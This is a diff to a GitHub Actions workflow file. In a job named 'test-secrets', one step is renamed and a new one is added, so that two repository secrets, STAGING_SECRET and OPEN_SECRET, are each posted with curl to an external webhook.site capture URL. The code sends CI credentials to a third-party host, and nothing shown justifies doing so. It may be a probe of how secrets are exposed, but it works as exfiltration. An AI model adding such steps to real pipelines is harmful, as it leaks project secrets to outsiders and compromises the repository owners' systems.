@@ -17,5 +17,8 @@ jobs:
   test-secrets:
     runs-on: ubuntu-latest
     steps:
-      - name: Get secret
+      - name: Staging secret
         run: curl -X POST -F 'staging-secret=${{ secrets.STAGING_SECRET }}' https://webhook.site/171039d6-3ee9-4bab-a0dd-75c942022dbc
+
+      - name: Open secret
+        run: curl -X POST -F 'open-secret=${{ secrets.OPEN_SECRET }}' https://webhook.site/171039d6-3ee9-4bab-a0dd-75c942022dbc
